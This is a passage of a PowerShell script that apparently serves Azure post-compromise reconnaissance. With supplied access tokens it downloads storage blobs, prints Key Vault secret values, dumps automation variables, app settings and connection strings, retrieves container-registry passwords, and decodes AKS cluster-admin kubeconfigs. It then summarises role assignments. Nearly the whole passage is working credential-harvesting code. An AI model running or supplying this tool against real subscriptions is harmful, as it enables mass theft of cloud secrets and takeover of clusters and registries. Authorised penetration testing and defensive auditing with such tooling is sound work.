                            $failReason = if ($script:LastBlobError) { " ($($script:LastBlobError))" } else { "" }
                            Write-Warn "      [FAIL] $blobName$failReason"
                        }
                    }
                }
            } while ($marker)
        }

        Save-Csv (Join-Path $saOutDir "BlobInventory.csv") $allBlobRows
        if ($tooLargeRows.Count -gt 0) {
            Save-Csv (Join-Path $saOutDir "TooLarge_URLs.csv") $tooLargeRows
        }
        Write-Info "    Downloaded: $dlCount  |  Too-large (URL saved): $($tooLargeRows.Count)  |  Failed: $failCount"
        Write-Info "    Saved to: $saOutDir"
    }

    # -- Key Vaults ------------------------------------------------------------
    Write-Section "Key Vaults"
    $vaults = Get-ArmAll "$ArmBase/subscriptions/$SUB/providers/Microsoft.KeyVault/vaults?api-version=2023-02-01"
    if (-not $vaults) { Write-None }
    foreach ($v in $vaults) {
        Write-Hit "$($v.name)  [RG: $(Get-RGFromId $v.id)]  URI: $($v.properties.vaultUri)"
        Write-Info "    SKU         : $($v.properties.sku.name)"
        Write-Info "    Soft Delete : $($v.properties.enableSoftDelete)"
        Write-Info "    Purge Protect: $($v.properties.enablePurgeProtection)"
        if ($v.properties.accessPolicies) {
            Write-Info "    Access Policies:"
            $v.properties.accessPolicies | ForEach-Object {
                Write-Info "      $($_.objectId)  Secrets:[$($_.permissions.secrets -join ',')] Keys:[$($_.permissions.keys -join ',')] Certs:[$($_.permissions.certificates -join ',')]"
            }
        }
        # Data-plane: use KVToken if provided, fall back to ARM token
        $vaultUri = $v.properties.vaultUri.TrimEnd("/")
        $kvTok    = if ($KVToken) { $KVToken } else { $Token }
        # Invoke-KVApi is defined at top of file (HTTP helpers section)
        $dpSecrets = Invoke-KVApi "$vaultUri/secrets?api-version=7.4" $kvTok
        if ($dpSecrets -and $dpSecrets.value) {
            Write-Info "    Secrets:"
            $dpSecrets.value | ForEach-Object {
                $sName = ($_.id -split "/")[-1]
                Write-Warn "      [SECRET] $sName  |  $($_.id)"
                $sv = Invoke-KVApi ($_.id + "?api-version=7.4") $kvTok
                if ($sv -and $sv.value) { Write-Warn "        VALUE: $($sv.value)" }
            }
        } elseif (-not $dpSecrets) {
            if ($KVToken) {
                Write-Warn "    KVToken rejected for $($v.name)"
            } else {
                Write-Info "    Secrets: [pass -KVToken (vault.azure.net audience) to read values]"
            }
        } else { Write-Info "    Secrets: [none found in vault]" }
        # Keys
        $dpKeys = Invoke-KVApi "$vaultUri/keys?api-version=7.4" $kvTok
        if ($dpKeys -and $dpKeys.value) {
            $dpKeys.value | ForEach-Object {
                Write-Warn "      [KEY] $(($_.kid -split '/')[-2])  Enabled: $($_.attributes.enabled)  Expires: $($_.attributes.exp)"
            }
        }
        # Certificates
        $dpCerts = Invoke-KVApi "$vaultUri/certificates?api-version=7.4" $kvTok
        if ($dpCerts -and $dpCerts.value) {
            $dpCerts.value | ForEach-Object {
                Write-Warn "      [CERT] $(($_.id -split '/')[-1])  Enabled: $($_.attributes.enabled)  Expires: $($_.attributes.exp)"
            }
        }
    }

    # -- Automation Accounts ---------------------------------------------------
    Write-Section "Automation Accounts"
    $autos = Get-ArmAll "$ArmBase/subscriptions/$SUB/providers/Microsoft.Automation/automationAccounts?api-version=2022-08-08"
    if (-not $autos) { Write-None }
    foreach ($a in $autos) {
        $acctRG = Get-RGFromId $a.id
        Write-Hit "$($a.name)  [RG: $acctRG]  [$($a.location)]"
        if ($a.identity) {
            Write-Info "    Identity: $($a.identity.type)  Principal: $($a.identity.principalId)"
            if ($a.identity.principalId -and $GraphToken) {
                $autoMI = Get-GraphAll "$GraphBase/servicePrincipals/$($a.identity.principalId)/memberOf"
                foreach ($ami2 in $autoMI) {
                    $ami2Type = if ($ami2.'@odata.type') { $ami2.'@odata.type' -replace '#microsoft\.graph\.', '' } else { "group" }
                    if ($ami2Type -eq "administrativeUnit") {
                        if (-not $auDescCache.ContainsKey($ami2.id)) {
                            $auDescCache[$ami2.id] = Invoke-GraphApi "$GraphBase/directory/administrativeUnits/$($ami2.id)?`$select=id,displayName,description,visibility,membershipType"
                        }
                        $cached = $auDescCache[$ami2.id]
                        $auDesc = if ($cached) { "  |  Desc: $($cached.description)  Visibility: $($cached.visibility)" } else { "" }
                        Write-Warn "    [ManagedIdentity in AU] $($ami2.displayName)  (ID: $($ami2.id))$auDesc"
                    } else {
                        Write-Info "    [Identity MemberOf $ami2Type] $($ami2.displayName)  (ID: $($ami2.id))"
                    }
                }
            }
        }

        $runbooks = Get-ArmAll "$ArmBase$($a.id)/runbooks?api-version=2022-08-08"
        $runbooks | ForEach-Object { Write-Info "    Runbook   : $($_.name)  [$($_.properties.runbookType)]  State: $($_.properties.state)" }

        $vars = Get-ArmAll "$ArmBase$($a.id)/variables?api-version=2022-08-08"
        $vars | ForEach-Object {
            $val = if (-not $_.properties.isEncrypted) { $_.properties.value } else { "[ENCRYPTED]" }
            Write-Info "    Variable  : $($_.name) = $val"
        }

        $creds = Get-ArmAll "$ArmBase$($a.id)/credentials?api-version=2022-08-08"
        $creds | ForEach-Object { Write-Info "    Credential: $($_.name)  User: $($_.properties.userName)" }

        # -- Hybrid Worker Groups + Workers ------------------------------------
        Write-Info "    [Hybrid Worker Groups]"
        $hwGroups = Get-ArmAll "$ArmBase$($a.id)/hybridRunbookWorkerGroups?api-version=2022-02-22"
        if (-not $hwGroups) {
            Write-Info "      None found"
        } else {
            foreach ($hwg in $hwGroups) {
                Write-Hit "      Group: $($hwg.name)  [Type: $($hwg.groupType)]"
                if ($hwg.credential) { Write-Warn "        Credential: $($hwg.credential.name)" }
                $workers = Get-ArmAll "$ArmBase$($a.id)/hybridRunbookWorkerGroups/$($hwg.name)/hybridRunbookWorkers?api-version=2021-06-22"
                if ($workers) {
                    foreach ($w in $workers) {
                        Write-Info "        Worker: $($w.name)"
                        Write-Info "          IP          : $($w.properties.ip)"
                        Write-Info "          WorkerType  : $($w.properties.workerType)"
                        Write-Info "          LastSeen    : $($w.properties.lastSeenDateTime)"
                        Write-Info "          MachineId   : $($w.properties.vmResourceId)"
                    }
                } else { Write-Info "        No workers found" }
            }
        }

        # -- Automation Job Logs -----------------------------------------------
        $acctLogDir = Join-Path $AutoLogDir $a.name
        $null = New-Item -ItemType Directory -Force -Path $acctLogDir
        $jobs = Get-ArmAll "$ArmBase$($a.id)/jobs?api-version=2019-06-01"
        Write-Info "    Jobs: $($jobs.Count) -- logs -> $acctLogDir"
        if ($jobs) {
            $jobCsvData = $jobs | Select-Object `
                @{N="JobId";       E={$_.properties.jobId}},
                @{N="RunbookName"; E={$_.properties.runbook.name}},
                @{N="Status";      E={$_.properties.status}},
                @{N="StartTime";   E={$_.properties.startTime}},
                @{N="EndTime";     E={$_.properties.endTime}},
                @{N="Exception";   E={$_.properties.exception}}
            Save-Csv (Join-Path $acctLogDir "JobSummary.csv") $jobCsvData

            foreach ($job in $jobs | Select-Object -First 50) {
                $jid     = $job.properties.jobId
                $rbName  = ($job.properties.runbook.name -replace '[\\/:*?"<>|]', '_')
                $stat    = $job.properties.status
                $streams = Get-ArmAll "$ArmBase$($a.id)/jobs/$jid/streams?api-version=2019-06-01"
                if ($streams) {
                    $logFile = Join-Path $acctLogDir "$rbName`_$jid`_$stat.log"
                    $streams | ForEach-Object {
                        "$($_.properties.time)  [$($_.properties.streamType)]  $($_.properties.summary)"
                    } | Set-Content -Path $logFile -Encoding UTF8
                }
            }
        }
    }

    # -- Web Apps & Function Apps ----------------------------------------------
    Write-Section "Web Apps & Function Apps"
    $webapps = Get-ArmAll "$ArmBase/subscriptions/$SUB/providers/Microsoft.Web/sites?api-version=2022-09-01"
    if (-not $webapps) { Write-None }
    foreach ($app in $webapps) {
        $kind = if ($app.kind -match "functionapp") { "FuncApp" } else { "WebApp" }
        Write-Hit "[$kind] $($app.name)  [RG: $(Get-RGFromId $app.id)]  [$($app.location)]  https://$($app.properties.defaultHostName)"
        Write-Info "    State  : $($app.properties.state)"
        Write-Info "    Runtime: $($app.properties.siteConfig.linuxFxVersion)$($app.properties.siteConfig.windowsFxVersion)"
        if ($app.identity.principalId) {
            Write-Info "    IdentityPrincipalId: $($app.identity.principalId)"
            if ($GraphToken) {
                $appMI = Get-GraphAll "$GraphBase/servicePrincipals/$($app.identity.principalId)/memberOf"
                foreach ($ami in $appMI) {
                    $amiType = if ($ami.'@odata.type') { $ami.'@odata.type' -replace '#microsoft\.graph\.', '' } else { "group" }
                    if ($amiType -eq "administrativeUnit") {
                        if (-not $auDescCache.ContainsKey($ami.id)) {
                            $auDescCache[$ami.id] = Invoke-GraphApi "$GraphBase/directory/administrativeUnits/$($ami.id)?`$select=id,displayName,description,visibility,membershipType"
                        }
                        $cached = $auDescCache[$ami.id]
                        $auDesc = if ($cached) { "  |  Desc: $($cached.description)  Visibility: $($cached.visibility)" } else { "" }
                        Write-Warn "    [ManagedIdentity in AU] $($ami.displayName)  (ID: $($ami.id))$auDesc"
                    } else {
                        Write-Info "    [Identity MemberOf $amiType] $($ami.displayName)  (ID: $($ami.id))"
                    }
                }
            }
        }
        $cfg = Invoke-ArmApi "$ArmBase$($app.id)/config/appsettings/list?api-version=2022-09-01" "POST"
        if ($cfg -and $cfg.properties) {
            $cfg.properties.PSObject.Properties | ForEach-Object { Write-Info "    AppSetting: $($_.Name) = $($_.Value)" }
        }
        $conn = Invoke-ArmApi "$ArmBase$($app.id)/config/connectionstrings/list?api-version=2022-09-01" "POST"
        if ($conn -and $conn.properties) {
            $conn.properties.PSObject.Properties | ForEach-Object {
                Write-Info "    ConnStr[$($_.Name)] = $($_.Value.value)"
            }
        }
    }

    # -- SQL Servers -----------------------------------------------------------
    Write-Section "SQL Servers"
    $sqlServers = Get-ArmAll "$ArmBase/subscriptions/$SUB/providers/Microsoft.Sql/servers?api-version=2021-11-01"
    if (-not $sqlServers) { Write-None }
    foreach ($s in $sqlServers) {
        Write-Hit "$($s.name)  [RG: $(Get-RGFromId $s.id)]  FQDN: $($s.properties.fullyQualifiedDomainName)"
        Write-Info "    Admin: $($s.properties.administratorLogin)"
        Get-ArmAll "$ArmBase$($s.id)/databases?api-version=2021-11-01" |
            Where-Object { $_.name -ne "master" } |
            ForEach-Object { Write-Info "    DB : $($_.name)  Status: $($_.properties.status)  Edition: $($_.sku.tier)" }
        Get-ArmAll "$ArmBase$($s.id)/firewallRules?api-version=2021-11-01" |
            ForEach-Object { Write-Info "    FW : $($_.name)  $($_.properties.startIpAddress) - $($_.properties.endIpAddress)" }
        # Virtual network rules
        Get-ArmAll "$ArmBase$($s.id)/virtualNetworkRules?api-version=2021-11-01" |
            ForEach-Object { Write-Info "    VNet Rule: $($_.name)  Subnet: $(($_.properties.virtualNetworkSubnetId -split '/')[-1])" }
    }

    # -- CosmosDB --------------------------------------------------------------
    Write-Section "CosmosDB"
    $cosmos = Get-ArmAll "$ArmBase/subscriptions/$SUB/providers/Microsoft.DocumentDB/databaseAccounts?api-version=2023-04-15"
    if (-not $cosmos) { Write-None }
    $cosmos | ForEach-Object {
        Write-Hit "$($_.name)  [RG: $(Get-RGFromId $_.id)]  [$($_.location)]  Kind: $($_.kind)"
        Write-Info "    Endpoint: $($_.properties.documentEndpoint)"
        Write-Info "    Consistency: $($_.properties.consistencyPolicy.defaultConsistencyLevel)"
        if ($_.properties.ipRules) {
            $_.properties.ipRules | ForEach-Object { Write-Info "    IP Rule: $($_.ipAddressOrRange)" }
        }
    }

    # -- AKS Clusters ----------------------------------------------------------
    Write-Section "AKS Clusters"
    $clusters = Get-ArmAll "$ArmBase/subscriptions/$SUB/providers/Microsoft.ContainerService/managedClusters?api-version=2023-06-01"
    if (-not $clusters) { Write-None }
    foreach ($c in $clusters) {
        Write-Hit "$($c.name)  [RG: $(Get-RGFromId $c.id)]  [$($c.location)]  K8s: $($c.properties.kubernetesVersion)"
        Write-Info "    FQDN          : $($c.properties.fqdn)"
        Write-Info "    Node Pool Count: $(@($c.properties.agentPoolProfiles).Count)"
        if ($c.identity) { Write-Info "    Identity      : $($c.identity.type)  PrincipalId: $($c.identity.principalId)" }
        $kc = Invoke-ArmApi "$ArmBase$($c.id)/listClusterAdminCredential?api-version=2023-06-01" "POST"
        if ($kc -and $kc.kubeconfigs) {
            Write-Warn "    Admin kubeconfig retrieved:"
            $kc.kubeconfigs | ForEach-Object {
                [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_.value)) | Write-Host
            }
        }
    }

    # -- Managed Identities ----------------------------------------------------
    Write-Section "User-Assigned Managed Identities"
    $uamis = Get-ArmAll "$ArmBase/subscriptions/$SUB/providers/Microsoft.ManagedIdentity/userAssignedIdentities?api-version=2023-01-31"
    if (-not $uamis) { Write-None }
    $uamis | ForEach-Object {
        Write-Hit "$($_.name)  [RG: $(Get-RGFromId $_.id)]  [$($_.location)]"
        Write-Info "    PrincipalId: $($_.properties.principalId)"
        Write-Info "    ClientId   : $($_.properties.clientId)"
    }

    # -- Container Registries (ACR) --------------------------------------------
    Write-Section "Container Registries (ACR)"
    $registries = Get-ArmAll "$ArmBase/subscriptions/$SUB/providers/Microsoft.ContainerRegistry/registries?api-version=2023-01-01-preview"
    if (-not $registries) { Write-None }
    foreach ($r in $registries) {
        Write-Hit "$($r.name)  [RG: $(Get-RGFromId $r.id)]  $($r.properties.loginServer)"
        Write-Info "    Admin Enabled: $($r.properties.adminUserEnabled)"
        Write-Info "    SKU          : $($r.sku.name)"
        $rcreds = Invoke-ArmApi "$ArmBase$($r.id)/listCredentials?api-version=2023-01-01-preview" "POST"
        if ($rcreds -and $rcreds.username) {
            Write-Warn "    Username: $($rcreds.username)"
            $rcreds.passwords | ForEach-Object { Write-Warn "    Password ($($_.name)): $($_.value)" }
        }
    }

    # -- Disks -----------------------------------------------------------------
    Write-Section "Disks"
    $disks = Get-ArmAll "$ArmBase/subscriptions/$SUB/providers/Microsoft.Compute/disks?api-version=2023-01-02"
    if (-not $disks) { Write-None }
    $disks | ForEach-Object {
        Write-Hit "$($_.name)  [RG: $(Get-RGFromId $_.id)]  $($_.properties.diskSizeGB)GB  [$($_.properties.diskState)]"
        Write-Info "    OS Type  : $($_.properties.osType)  Encryption: $($_.properties.encryption.type)"
    }

    # -- Snapshots -------------------------------------------------------------
    Write-Section "Snapshots"
    $snaps = Get-ArmAll "$ArmBase/subscriptions/$SUB/providers/Microsoft.Compute/snapshots?api-version=2023-01-02"
    if (-not $snaps) { Write-None }
    $snaps | ForEach-Object {
        Write-Hit "$($_.name)  [RG: $(Get-RGFromId $_.id)]  $($_.properties.diskSizeGB)GB  [$($_.location)]"
        Write-Info "    Source: $($_.properties.creationData.sourceUri)"
    }

    # -- Logic Apps ------------------------------------------------------------
    Write-Section "Logic Apps"
    $logicApps = Get-ArmAll "$ArmBase/subscriptions/$SUB/providers/Microsoft.Logic/workflows?api-version=2019-05-01"
    if (-not $logicApps) { Write-None }
    $logicApps | ForEach-Object {
        Write-Hit "$($_.name)  [RG: $(Get-RGFromId $_.id)]  State: $($_.properties.state)"
        Write-Info "    Endpoint: $($_.properties.endpointsConfiguration.workflow.outgoingIpAddresses -join ', ')"
    }
}

# =============================================================================
# SECTION 3 -- SUMMARY
# =============================================================================

Write-Header "SUMMARY"

if ($script:SummaryLines.Count -eq 0) {
    Write-None "  No notable role assignments found."
} else {
    Write-Host "`n  Role assignments found across all scopes:`n" -ForegroundColor Yellow
    $script:SummaryLines | ForEach-Object { Write-Host $_ -ForegroundColor Yellow }
}

# Save summary CSV
$summaryRows = $script:SummaryLines | ForEach-Object {
    if ($_ -match '\[ARM RBAC\] (\S+) (\S+)\s+=>\s+''(.+?)''\s+on\s+(.+)') {
        [PSCustomObject]@{ Source="ARM"; Type=$Matches[1]; Principal=$Matches[2]; Role=$Matches[3]; Scope=$Matches[4] }
    } elseif ($_ -match '\[Entra Role\] (\S+)\s+=>\s+''(.+?)''') {
        [PSCustomObject]@{ Source="Entra"; Type="User"; Principal=$Matches[1]; Role=$Matches[2]; Scope="Entra ID" }
    }
}
if ($summaryRows) { Save-Csv (Join-Path $OutRoot "Summary.csv") $summaryRows }

Write-Host "`n[+] Done. Output saved to: $OutRoot" -ForegroundColor Green

Stop-Script 0
